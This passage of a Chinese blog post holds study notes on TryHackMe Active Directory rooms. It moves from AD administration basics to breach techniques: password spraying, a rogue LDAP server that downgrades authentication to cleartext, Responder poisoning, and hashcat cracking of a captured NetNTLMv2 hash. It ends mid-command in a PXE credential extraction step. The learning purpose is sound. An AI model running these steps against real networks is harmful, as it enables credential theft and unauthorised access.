管理单元</h3><p>要在 Active Directory 中配置用户、组或机器，我们需要登录域控制器，并从开始菜单中运行 “Active Directory Users and Computers”：</p><p>这将打开一个窗口，你可以看到域中存在的用户、计算机和组的层次结构。这些对象按组织单位 (Organizational Units OU) 组织，组织单位是一种容器对象，可以对用户和计算机进行分类。OUs 主要用于定义具有类似监控要求的用户集合。请记住，一个用户在同一时间只能属于一个 OU。</p><p>Windows 自动创建的 OU，包含以下内容：</p><ul><li>Builtin： 包含任何 Windows 主机都可使用的默认组。</li><li>Computers： 任何加入网络的机器都会默认放在这里。如有需要，您可以移动它们。</li><li>Domain Controllers： 包含网络中 DC 的默认 OU。</li><li>Users： 适用于全域范围的默认用户和组。</li><li>Managed Service Accounts： 保存 Windows 域中服务使用的账户。</li></ul><h3 id="Security-Groups-vs-OUs"><a href="#Security-Groups-vs-OUs" class="headerlink" title="Security Groups vs OUs"></a>Security Groups vs OUs</h3><p>你可能想知道为什么我们既有组又有 OU。虽然两者都用于对用户和计算机进行分类，但它们的目的完全不同：</p><ul><li>OU 可以方便地将策略应用到用户和计算机，其中包括根据用户在企业中的特定角色对其进行特定配置。请记住，一个用户在同一时间只能是一个 OU 的成员，因为试图对一个用户应用两套不同的策略是没有意义的。</li><li>另一方面，安全组用于授予资源权限。例如，如果要允许某些用户访问共享文件夹或网络打印机，就需要使用组。<strong>一个</strong>用户可以是<strong>多个</strong>组的成员，这是对多个资源授予访问权限所必需的。</li></ul><h2 id="管理-AD"><a href="#管理-AD" class="headerlink" title="管理 AD"></a>管理 AD</h2><h3 id="删除额外的-OU-和用户"><a href="#删除额外的-OU-和用户" class="headerlink" title="删除额外的 OU 和用户"></a>删除额外的 OU 和用户</h3><p>需要关闭 Advanced Features -&gt; Object -&gt; Protect object from accidental deletion</p><h3 id="委派-Delegation"><a href="#委派-Delegation" class="headerlink" title="委派 Delegation"></a>委派 Delegation</h3><p>在 AD 中可以做的一件好事就是让特定用户对某些 OU 享有一定的控制权。这个过程被称为委派，允许你授予用户在 OU 上执行高级任务的特定权限，而不需要域管理员介入。最常见的使用案例之一就是授予 IT 支持人员重置其他低权限用户密码的权限。</p><p>给 OU 委派，右键选择 Delegate Control -&gt; Add -&gt; Check Names -&gt; 选择要委派的权限。</p><figure class="shiki powershell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 重置密码</span></span><span class="line"><span style="color: #56B6C2">Set-ADAccountPassword</span><span style="color: #ABB2BF"> sophie </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Reset </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">NewPassword (</span><span style="color: #56B6C2">Read-Host</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">AsSecureString </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Prompt </span><span style="color: #98C379">&#39;New Password&#39;</span><span style="color: #ABB2BF">) </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Verbose</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 强制用户在登录时改密码</span></span><span class="line"><span style="color: #56B6C2">Set-ADUser</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">ChangePasswordAtLogon </span><span style="color: #D19A66">$true</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Identity sophie </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF">Verbose</span></span></code></pre></div></div></figure><h3 id="管理计算机"><a href="#管理计算机" class="headerlink" title="管理计算机"></a>管理计算机</h3><p>默认情况下，所有加入域的计算机（DC 除外）都会被放入名为“Computers”的容器中。</p><p>我们可以看到一些服务器、一些笔记本电脑和一些 PC，它们分别对应着我们网络中的用户。将所有设备都放在那里并不是最好的选择，因为您很可能希望针对服务器和普通用户日常使用的机器设置不同的策略。</p><p>虽然没有关于如何组织你的机器的黄金法则，但一个很好的起点是根据设备的用途进行分类。通常，你会看到设备至少分为以下三类：</p><p><strong>1.工作站</strong></p><p>工作站是 Active Directory 域中最常见的设备之一。域中的每个用户都可能登录到工作站。他们将使用该设备进行工作或进行正常的浏览活动。这些设备绝对不应该有特权用户登录。</p><p><strong>2. 服务器</strong></p><p>服务器是 Active Directory 域中第二常见的设备。服务器通常用于向用户或其他服务器提供服务。</p><p><strong>3. 域控制器</strong></p><p>域控制器是 Active Directory 域中第三常见的设备。域控制器允许您管理 Active Directory 域。这些设备通常被视为网络中最敏感的设备，因为它们包含环境中所有用户帐户的哈希密码。</p><h2 id="Group-Policies-组策略"><a href="#Group-Policies-组策略" class="headerlink" title="Group Policies 组策略"></a>Group Policies 组策略</h2><p>到目前为止，我们只是为了方便而将用户和计算机组织到 OU 中，但这背后的主要想法是能够为每个 OU 单独部署不同的策略。这样，我们就可以根据用户所在的部门向其推送不同的配置和安全基线。</p><p>Windows 通过组策略对象（GPO）来管理此类策略。GPO 只是一组可应用于 OU 的设置集合。GPO 可以包含针对用户或计算机的策略，允许您为特定的机器和身份设置基线。</p><p>要配置 GPO，可以使用 “开始 ”菜单中的 “组策略管理 ”工具：</p><p>打开它后，首先看到的是之前定义的完整 OU 层次结构。要配置组策略，首先要在组策略对象下创建一个 GPO，然后将其链接到要应用策略的 OU。举例来说，你可以看到机器中已经存在一些 GPO：</p><img src="/thm_ad/d82cb9440894c831f6f3d58a2b0538ed.png" class="" title="https:&#x2F;&#x2F;tryhackme-images.s3.amazonaws.com&#x2F;user-uploads&#x2F;5ed5961c6276df568891c3ea&#x2F;room-content&#x2F;d82cb9440894c831f6f3d58a2b0538ed.png"><p>可以在 Group Policy Objects 里面看到创建的 GPO，然后对应的链接到 GPO 的地方是有一个快捷方式一样的小图标。</p><p>让我们检查一下 “默认域策略”，看看 GPO 内部有什么。选择 GPO 时看到的第一个选项卡会显示其范围，即 GPO 在 AD 中的链接位置。对于当前策略，我们可以看到它只链接到了 thm.local 域：</p><img src="/thm_ad/06d5e70fbfa648f73e4598e18c8e9527.png" class="" title="https:&#x2F;&#x2F;tryhackme-images.s3.amazonaws.com&#x2F;user-uploads&#x2F;5ed5961c6276df568891c3ea&#x2F;room-content&#x2F;06d5e70fbfa648f73e4598e18c8e9527.png"><p>如您所见，您还可以对 GPO 应用安全过滤，使其只应用于 OU 下的特定用户&#x2F;计算机。默认情况下，它们将应用于 “已验证用户 ”组，其中包括所有用户&#x2F;计算机。</p><p>设置选项卡包括 GPO 的实际内容，让我们知道它适用于哪些特定配置。如前所述，每个 GPO 都有只适用于计算机的配置和只适用于用户的配置。在本例中，默认域策略只包含计算机配置：</p><img src="/thm_ad/c9293853549d5126b77bf2de8086e076.png" class="" title="OU Settings"><p>后面就是进 GPO 编辑器改了，跟我们 <code>gpedit.msc</code> 一样的，不过这个会应用到应用了 GPO 的 OU 上。但是 GPO 不能直接应用在组上，但可以通过<strong>安全筛选</strong>来让它只对某个组生效。</p><h3 id="分发-GPO"><a href="#分发-GPO" class="headerlink" title="分发 GPO"></a>分发 GPO</h3><p>GPO 通过名为 SYSVOL 的网络共享分发到网络，该共享存储在 DC 中。域中的所有用户通常都可以通过网络访问该共享，以定期同步他们的 GPO。SYSVOL 共享默认指向网络中每个 DC 上的 C:\Windows\SYSVOL\sysvol\ 目录。</p><p>一旦对任何 GPO 进行了更改，计算机可能需要长达 2 个小时的时间才能跟上。如果要强制任何特定计算机立即同步其 GPO，可以在所需计算机上运行以下命令：</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">gpupdate /force</span></span></code></pre></div></div></figure><h2 id="认证方式"><a href="#认证方式" class="headerlink" title="认证方式"></a>认证方式</h2><p>使用 Windows 域时，所有凭据都存储在域控制器中。每当用户尝试使用域凭据对服务进行身份验证时，服务都需要请求域控制器验证凭据是否正确。在 Windows 域中，有两种协议可用于网络身份验证：</p><ul><li>Kerberos 协议： 任何最新版本的 Windows 都会使用。这是任何新版域的默认协议。</li><li>NetNTLM：出于兼容性目的而保留的传统身份验证协议。</li></ul><p>虽然 NetNTLM 应被视为过时协议，但大多数网络都会启用这两种协议。让我们深入了解一下这两种协议的工作原理。</p><h3 id="Kerberos-Authentication"><a href="#Kerberos-Authentication" class="headerlink" title="Kerberos Authentication"></a>Kerberos Authentication</h3><ol><li>用户携带用户名和用户自己的 Hash 加密过的时间戳向 KDC 请求 TGT</li><li>KDC 回复一个 TGT，里面有一份 Session Key，不过是用 krbtgt 账户 Hash 加密过的。和一个使用用户 Hash 加密的 Session Key 返回给用户</li><li>当用户想请求网络上的一个服务时，会向 KDC 请求一个 TGS。发送过去的东西有<ol><li>用 Session Key 加密过的用户名和时间戳</li><li>上一步 KDC 返回回来的 TGT</li><li>SPN（服务主体名称）</li></ol></li><li>然后 KDC 回复一个用服务所有者账户 Hash 加密的 TGS，这个 TGS 里面有 Svc Session Key。和一个用 Session Key 加密的 Svc Session Key。</li><li>当用户请求一个服务时，会发送用 Svc Session Key 加密过的用户名和时间戳。还有包含 Svc Session Key 的 TGS。<ul><li>TGS 里面是有 Svc Session Key 的，然后服务器可以用它的 Hash 去解密 TGS，拿到 Svc Session Key，就能解密用户的数据包了</li></ul></li></ol><h3 id="NetNTLM-Authentication"><a href="#NetNTLM-Authentication" class="headerlink" title="NetNTLM Authentication"></a>NetNTLM Authentication</h3><p>NetNTLM 采用挑战-响应机制工作。整个过程如下：</p><img src="/thm_ad/2eab5cacbd0d3e9dc9afb86169b711ec.png" class="" title="NetNTLM authentication"><ol><li>客户端向想要访问的服务器发送验证请求。</li><li>服务器会生成一个随机数，并将其作为挑战发送给客户端。</li><li>客户端将其 NTLM 密码哈希值与挑战（及其他已知数据）相结合，生成对挑战的响应，并将其发送回服务器进行验证。</li><li>服务器将挑战和响应转发给域控制器进行验证。</li><li>域控制器使用挑战重新计算响应，并将其与客户端发送的原始响应进行比较。如果两者匹配，则客户端通过验证；否则，拒绝访问。身份验证结果将发回服务器。</li><li>服务器将验证结果转发给客户端。</li></ol><p>请注意，为了安全起见，用户密码（或哈希值）绝不会通过网络传输。</p><p>注意：所述过程适用于使用域帐户的情况。如果使用的是本地账户，服务器可自行验证对挑战的响应，而无需与域控制器交互，因为服务器的 SAM 上本地存储有密码哈希值。</p><h2 id="Trees-Forests-and-Trusts"><a href="#Trees-Forests-and-Trusts" class="headerlink" title="Trees, Forests and Trusts"></a>Trees, Forests and Trusts</h2><p>随着公司的发展，其网络也在不断发展。开始时，公司拥有一个域名就足够了，但随着时间的推移，一些额外的需求可能会促使你拥有多个域名。</p><h3 id="树-Trees"><a href="#树-Trees" class="headerlink" title="树 Trees"></a>树 Trees</h3><p>例如，设想一下，您的公司突然扩展到一个新的国家。新的国家有不同的法律法规，要求您更新 GPO 以符合规定。此外，您现在在两个国家都有 IT 人员，每个 IT 团队都需要在不干扰其他团队的情况下管理与每个国家相对应的资源。虽然您可以创建复杂的 OU 结构并使用授权来实现这一目标，但庞大的 AD 结构可能难以管理，而且容易出现人为错误。</p><p>幸运的是，Active Directory 支持整合多个域，这样您就可以将网络划分为可以独立管理的单元。如果您有两个共享相同名称空间的域，那么这两个域可以连接成一棵树。</p><p>如果我们的 thm.local 域被分为英国和美国分支的两个子域，则可以建立一个树状结构，其中包括一个根域 thm.local，以及名为 uk.thm.local 和 us.thm.local 的两个子域，每个子域都有自己的 AD、计算机和用户：</p><img src="/thm_ad/abea24b7979676a1dcc0c568054544c8.png" class="" title="Tree"><p>这种分区结构可以让我们更好地控制谁可以访问域中的哪些内容。英国的 IT 人员将有自己的 DC，只管理英国的资源。例如，英国用户将无法管理美国用户。这样，每个分支机构的域管理员就可以完全控制各自的 DC，但不能控制其他分支机构的 DC。还可以为树状结构中的每个域独立配置策略。</p><p>在谈及树和林时，需要引入一个新的安全组。企业管理员组将授予用户对企业所有域的管理权限。每个域仍有域管理员，他们对自己的单个域拥有管理员权限，而企业管理员则可以控制企业中的一切。</p><h3 id="森林-Forests"><a href="#森林-Forests" class="headerlink" title="森林 Forests"></a>森林 Forests</h3><p>您管理的域也可以配置在不同的命名空间中。假设贵公司不断发展壮大，最终收购了另一家名为 MHT Inc. 两家公司合并后，每家公司可能会有不同的域树，分别由各自的 IT 部门管理。将多个具有不同命名空间的域树合并到同一网络中称为森林。</p><img src="/thm_ad/03448c2faf976db890118d835000bab7.png" class="" title="Forest"><h3 id="信任关系-Trust-Relationships"><a href="#信任关系-Trust-Relationships" class="headerlink" title="信任关系 Trust Relationships"></a>信任关系 Trust Relationships</h3><p>将多个域以树和森林的形式组织起来，可以在管理和资源方面形成一个良好的分隔网络。但在某些情况下，THM UK 的用户可能需要访问 MHT ASIA 服务器中的某个共享文件。为此，以树和森林形式排列的域通过信任关系连接在一起。</p><p>简单地说，域之间的信任关系允许您授权域 THM UK 的用户访问域 MHT EU 的资源。</p><p>可以建立的最简单的信任关系是单向信任关系。在单向信任关系中，如果网域 AAA 信任网域 BBB，这就意味着可以授权 BBB 上的用户访问 AAA 上的资源：</p><img src="/thm_ad/af95eb1a4b6c672491d8989f79c00200.png" class="" title="Trusts"><p>单向信任关系的方向与访问方向相反。</p><p>也可以建立双向信任关系，允许两个域相互授权对方的用户。默认情况下，在树或森林下连接多个域将形成双向信任关系。</p><p>需要注意的是，域之间建立信任关系并不会自动授予访问其他域上所有资源的权限。一旦建立了信任关系，你就有机会授权不同域的用户，但授权与否取决于你。</p><hr><h1 id="Breaching-Active-Directory"><a href="#Breaching-Active-Directory" class="headerlink" title="Breaching Active Directory"></a>Breaching Active Directory</h1><p>首先是配置网络，说实话有点麻烦，要下官方他提供的那个专门用于 AD 域的配置文件，还要把系统的 DNS 覆盖掉。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">vim</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/etc/resolv.conf</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 锁定和解锁文件</span></span><span class="line"><span style="color: #61AFEF">chattr</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">+i</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/etc/resolv.conf</span></span><span class="line"><span style="color: #61AFEF">chattr</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-i</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/etc/resolv.conf</span></span></code></pre></div></div></figure><p>其他的倒是没啥了，不过发现 223.5.5.5 在<del>我网络环境下面死掉了</del>。</p><p>并不是，是他自己死了：<a href="https://www.v2ex.com/t/1149042">https://www.v2ex.com/t/1149042</a></p><h2 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h2><p>这一节提了一下 NTLM 和 NetNTLM 概念，后者是接收到用户凭据之后，发送到 DC 服务器去认证，认证不在这个机器上进行而是在 DC 上做的。</p><p>密码喷洒意思是：用一个已知的密码去尝试其他的用户登录，用这种方式能避免被发现，如果爆破的话动静很大。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">python3</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ntlm_passwordspray.py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-u</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">usernames.txt</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">za.tryhackme.com</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Changeme123</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-a</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">http://ntlmauth.za.tryhackme.com/</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># Python 用这条命令安装缺的库</span></span><span class="line"><span style="color: #61AFEF">pip</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">install</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">requests_ntlm</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--break-system-packages</span></span></code></pre></div></div></figure><h2 id="LDAP-回传攻击"><a href="#LDAP-回传攻击" class="headerlink" title="LDAP 回传攻击"></a>LDAP 回传攻击</h2><p>这一节就是通过模拟 LDAP 服务器，强制降级认证方式然后从通信上截取明文密码，我觉得这里应该有开源的轮子。</p><p>题目是给了一个打印机服务器，密码不是明文存储的，但是我们可以通过修改他的服务器地址去截获他。</p><p>然后我们要搭建一个 LDAP 服务器，这里用的是 <code>SLAPD</code>。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 安装</span></span><span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">apt-get</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">update</span><span style="color: #ABB2BF"> &amp;&amp; </span><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">apt-get</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-y</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">install</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">slapd</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ldap-utils</span><span style="color: #ABB2BF"> &amp;&amp; </span><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">systemctl</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">enable</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">slapd</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 配置</span></span><span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">dpkg-reconfigure</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">low</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">slapd</span></span></code></pre></div></div></figure><p>然后要让认证降级成明文的，用到这样一个配置文件。</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">#olcSaslSecProps.ldif</span></span><span class="line"><span style="color: #abb2bf">dn: cn=config</span></span><span class="line"><span style="color: #abb2bf">replace: olcSaslSecProps</span></span><span class="line"><span style="color: #abb2bf">olcSaslSecProps: noanonymous,minssf=0,passcred</span></span></code></pre></div></div></figure><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 应用配置文件</span></span><span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ldapmodify</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-Y</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">EXTERNAL</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-H</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ldapi://</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">./olcSaslSecProps.ldif</span><span style="color: #ABB2BF"> &amp;&amp; </span><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">service</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">slapd</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">restart</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 测试配置文件</span></span><span class="line"><span style="color: #61AFEF">ldapsearch</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-H</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">ldap://</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-x</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-LLL</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-s</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">base</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-b</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">supportedSASLMechanisms</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># dn:</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># supportedSASLMechanisms: PLAIN</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># supportedSASLMechanisms: LOGIN</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 抓包</span></span><span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">tcpdump</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-SX</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-i</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">breachad</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">tcp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">port</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">389</span></span></code></pre></div></div></figure><h2 id="认证中继"><a href="#认证中继" class="headerlink" title="认证中继"></a>认证中继</h2><p>这一节讲述的是，在 Windows 机器的网络下面，很多服务会互相通信，允许用户使用这些网络中提供的服务。而这些服务会用身份验证方法去验证身份，这就让我们有了可乘之机，可以去抓取这些数据包去破解。</p><h3 id="Server-Message-Block-SMB"><a href="#Server-Message-Block-SMB" class="headerlink" title="Server Message Block (SMB)"></a>Server Message Block (SMB)</h3><p>在早期版本的 SMB 中安全性不足，有很多漏洞和利用点，尽管漏洞在新版中解决了，但是因为旧系统不支持这些版本或者其他原因，导致没有<strong>强制</strong>升级到最新版。</p><ul><li>抓 NTLM Challenge 包，离线破解，但是比直接爆破 NTLM hash 慢很多</li><li>可以自建服务器做 MTIM 攻击，截获认证成功的 session</li></ul><h3 id="LLMNR-NBT-NS-and-WPAD"><a href="#LLMNR-NBT-NS-and-WPAD" class="headerlink" title="LLMNR, NBT-NS, and WPAD"></a>LLMNR, NBT-NS, and WPAD</h3><p>在现实局域网上会有很多 NetNTLM challenge，有时因为过期的 DNS 记录，这些数据包可能会发到你伪造的服务器上。</p><p>文章介绍了一个 <a href="https://github.com/lgandx/Responder">Responder</a> 工具，他可以去实现 MITM。</p><p>在真实的局域网（LAN）中，<strong>Responder</strong> 会尝试<strong>投毒</strong>它检测到的任何<strong>链路本地多播名称解析</strong>、<strong>NetBIOS 名称服务</strong> 和 <strong>Web 代理自动发现</strong>请求。</p><p>在大型 Windows 网络中，这些协议能让主机去自己发现主机，而不是去请求 DNS 服务器，这些协议就类似于 DNS 一样的，不过他的行为更像 ARP。主机可以首先尝试通过发送 <strong>LLMNR (Link-Local Multicast Name Resolution)</strong> 请求，并查看是否有任何主机响应，来确定它们要查找的主机是否在同一个本地网络上。 <strong>NBT-NS (NetBIOS Name Service)</strong> 是 LLMNR 的前身协议，而 <strong>WPAD (Web Proxy Auto-Discovery)</strong> 请求是为了尝试查找未来 HTTP(s) 连接的代理服务器而发出的。</p><p>由于这些协议依赖于在本地网络中广播的请求，所以我们的<strong>恶意设备</strong>也能收到这些请求。通常，这些请求因为不是发给我们的主机，就会被简单地丢弃。然而，<strong>Responder</strong> 会积极监听这些请求，并发送<strong>伪造的响应</strong>，告诉发起请求的主机：<strong>我们的 IP 地址就是它想要连接的主机名对应的地址</strong>。通过投毒这些请求，Responder 试图强制客户端连接到我们的 <strong>攻击机</strong>。与此同时，它还会启动并托管多个服务器，比如 <strong>SMB、HTTP、SQL</strong> 等，以便捕获这些连接请求并<strong>强制进行身份验证</strong>，然后我们能直接抓到凭据或者是 hash。</p><h3 id="拦截-NetNTLM"><a href="#拦截-NetNTLM" class="headerlink" title="拦截 NetNTLM"></a>拦截 NetNTLM</h3><p>因为 Responder 是通过 race condition（比服务器更快响应给客户端）去给连接投毒的，这样我们才能拦截到这个连接。</p><p>还要小心 Responder 会干扰到正常业务，或者被检测到。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">python</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">responder.py</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-I</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">breachad</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 记得关掉前面开的 SLAPD</span></span><span class="line"><span style="color: #61AFEF">sudo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">service</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">slapd</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">stop</span></span></code></pre></div></div></figure><p>然后过一会就抓到 Hash 了，直接丢进 Hashcat 爆破。5600 是 NetNTLMv2，不同的 Hash 种类可以在<a href="https://hashcat.net/wiki/doku.php?id=example_hashes">这里</a>看。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #56B6C2">echo</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;svcFileCopy::ZA:d1fbc574572a06d8:AC7426941099D79E45ED19E4BBEB34BC:010100000000000000AB4DF0E601DC01817050186B6BCBB900000000020008004B0049004D00560001001E00570049004E002D004C00550038004800480044005900460032003200310004003400570049004E002D004C0055003800480048004400590046003200320031002E004B0049004D0056002E004C004F00430041004C00030014004B0049004D0056002E004C004F00430041004C00050014004B0049004D0056002E004C004F00430041004C000700080000AB4DF0E601DC01060004000200000008003000300000000000000000000000002000003EA8D95F89C068EA81D77546006E5A06B91A2AA73F678D23068A0A89689CD7400A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00350030002E00310038002E0037000000000000000000&quot;</span><span style="color: #ABB2BF"> &gt; </span><span style="color: #98C379">hash.txt</span><span style="color: #ABB2BF"> &amp;&amp; </span><span style="color: #61AFEF">hashcat</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-m</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">5600</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-a</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">hash.txt</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">./passwordlist-1647876320267.txt</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">--force</span></span></code></pre></div></div></figure><h3 id="SMB-Relay-中继"><a href="#SMB-Relay-中继" class="headerlink" title="SMB Relay 中继"></a>SMB Relay 中继</h3><p>如果 SMB 开了签名就寄了，可以通过 SMB 中继把认证成功的截获，然后以这个用户的身份去访问那些文件。</p><p>推荐房间：<a href="https://tryhackme.com/room/hololive">https://tryhackme.com/room/hololive</a></p><p>看了一下，这房间覆盖面好广，之后再来探索吧。</p><h2 id="微软部署工具包"><a href="#微软部署工具包" class="headerlink" title="微软部署工具包"></a>微软部署工具包</h2><p>介绍了一下 Microsoft Deployment Toolkit (MDT) 和 Microsoft’s System Center Configuration Manager (SCCM)，MDT 是集成在 SCCM 里面的，这俩是自动化安装系统&#x2F;打补丁工具，但是没有说具体实现，介绍一下思路。</p><h3 id="从镜像文件中提取凭据"><a href="#从镜像文件中提取凭据" class="headerlink" title="从镜像文件中提取凭据"></a>从镜像文件中提取凭据</h3><p>提了一下 MDT 可以用来管理 PXE 启动，题目的意思就是我们可以拿到他的配置文件，然后找到那个安装镜像，里面会存着用于配置系统的账户和密码，BCD 文件可以用 <a href="https://github.com/wavestone-cdt/powerpxe">PowerPXE</a> 提取里面的信息。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 取回 bcd 文件</span></span><span class="line"><span style="color: #61AFEF">tftp</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-i</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.200</span><span style="color: #98C379">.20.202</span><span style="color: #ABB2BF"> </span><span style="color: 